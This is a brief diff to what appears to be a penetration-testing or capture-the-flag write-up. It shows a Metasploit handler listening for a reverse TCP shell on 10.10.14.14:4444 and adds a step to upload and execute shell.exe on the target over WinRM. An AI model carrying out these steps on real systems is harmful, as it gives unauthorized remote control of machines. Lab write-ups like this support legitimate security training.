@@ -251,3 +251,5 @@ lport => 4444
 msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.10.14.14:4444
 ```
+
+Upload and Execute the `shell.exe` on the target machine using the existing WinRM session.
